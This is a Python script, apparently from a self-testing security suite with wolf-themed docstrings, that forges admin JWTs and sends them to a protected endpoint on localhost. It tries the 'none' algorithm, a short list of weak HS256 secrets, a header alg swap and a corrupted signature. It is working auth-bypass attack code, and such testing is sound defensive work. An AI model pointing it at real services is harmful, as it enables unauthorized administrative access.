"""🐺 JWT SIGNATURE BYPASS EXPLOIT

*snarls with predatory glee* Your JWT signature validation might be WEAK!
Algorithm confusion and signature bypass attacks can compromise your tokens!

*bares fangs with savage satisfaction* This exploit demonstrates various
signature bypass techniques.
"""

import time
from dataclasses import dataclass

import jwt
import requests
from rich.console import Console

console = Console()


@dataclass
class BypassResult:
    """Result of a signature bypass attempt"""

    success: bool
    technique: str
    description: str
    response_code: int


class SignatureBypassAttempt:
    """*circles with menacing intent* Attempts JWT signature bypass attacks
    """

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()

    def run_exploit(self) -> list[BypassResult]:
        """*snarls with predatory glee* Execute signature bypass attempts
        """
        console.print("[bold red]🐺 JWT SIGNATURE BYPASS ATTACK[/bold red]")

        results = []

        # Test various bypass techniques
        results.append(self._test_none_algorithm())
        results.append(self._test_weak_secret())
        results.append(self._test_algorithm_confusion())
        results.append(self._test_malformed_signature())

        return results

    def _test_none_algorithm(self) -> BypassResult:
        """Test None algorithm bypass"""
        try:
            # Create token with None algorithm
            payload = {
                "sub": "admin",
                "exp": int(time.time()) + 3600,
                "iat": int(time.time()),
            }

            token = jwt.encode(payload, "", algorithm="none")

            response = self._test_token(token)

            return BypassResult(
                success=response.status_code == 200,
                technique="None Algorithm",
                description="Attempted to use 'none' algorithm to bypass signature",
                response_code=response.status_code,
            )

        except Exception as e:
            return BypassResult(
                success=False,
                technique="None Algorithm",
                description=f"None algorithm test failed: {e!s}",
                response_code=0,
            )

    def _test_weak_secret(self) -> BypassResult:
        """Test weak secret brute force"""
        try:
            # Try common weak secrets
            weak_secrets = ["secret", "password", "123456", "admin", "test"]

            payload = {
                "sub": "admin",
                "exp": int(time.time()) + 3600,
                "iat": int(time.time()),
            }

            for secret in weak_secrets:
                try:
                    token = jwt.encode(payload, secret, algorithm="HS256")
                    response = self._test_token(token)

                    if response.status_code == 200:
                        return BypassResult(
                            success=True,
                            technique="Weak Secret",
                            description=f"Successfully bypassed with weak secret: {secret}",
                            response_code=response.status_code,
                        )
                except:
                    continue

            return BypassResult(
                success=False,
                technique="Weak Secret",
                description="No weak secrets found",
                response_code=401,
            )

        except Exception as e:
            return BypassResult(
                success=False,
                technique="Weak Secret",
                description=f"Weak secret test failed: {e!s}",
                response_code=0,
            )

    def _test_algorithm_confusion(self) -> BypassResult:
        """Test algorithm confusion attack"""
        try:
            # Try to confuse HS256 with RS256
            payload = {
                "sub": "admin",
                "exp": int(time.time()) + 3600,
                "iat": int(time.time()),
            }

            # Create token with HS256 but claim it's RS256
            token = jwt.encode(payload, "secret", algorithm="HS256")

            # Modify the header to claim RS256
            parts = token.split(".")
            header = jwt.get_unverified_header(token)
            header["alg"] = "RS256"

            # Re-encode with modified header
            import base64
            import json

            header_b64 = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )
            modified_token = f"{header_b64}.{parts[1]}.{parts[2]}"

            response = self._test_token(modified_token)

            return BypassResult(
                success=response.status_code == 200,
                technique="Algorithm Confusion",
                description="Attempted algorithm confusion attack",
                response_code=response.status_code,
            )

        except Exception as e:
            return BypassResult(
                success=False,
                technique="Algorithm Confusion",
                description=f"Algorithm confusion test failed: {e!s}",
                response_code=0,
            )

    def _test_malformed_signature(self) -> BypassResult:
        """Test malformed signature"""
        try:
            # Create token with malformed signature
            payload = {
                "sub": "admin",
                "exp": int(time.time()) + 3600,
                "iat": int(time.time()),
            }

            token = jwt.encode(payload, "secret", algorithm="HS256")

            # Corrupt the signature
            parts = token.split(".")
            corrupted_token = f"{parts[0]}.{parts[1]}.CORRUPTED_SIGNATURE"

            response = self._test_token(corrupted_token)

            return BypassResult(
                success=response.status_code == 200,
                technique="Malformed Signature",
                description="Attempted to use malformed signature",
                response_code=response.status_code,
            )

        except Exception as e:
            return BypassResult(
                success=False,
                technique="Malformed Signature",
                description=f"Malformed signature test failed: {e!s}",
                response_code=0,
            )

    def _test_token(self, token: str) -> requests.Response:
        """Test a token against protected endpoint"""
        headers = {"Authorization": f"Bearer {token}"}
        return self.session.get(
            f"{self.base_url}/api/protected", headers=headers, timeout=5,
        )
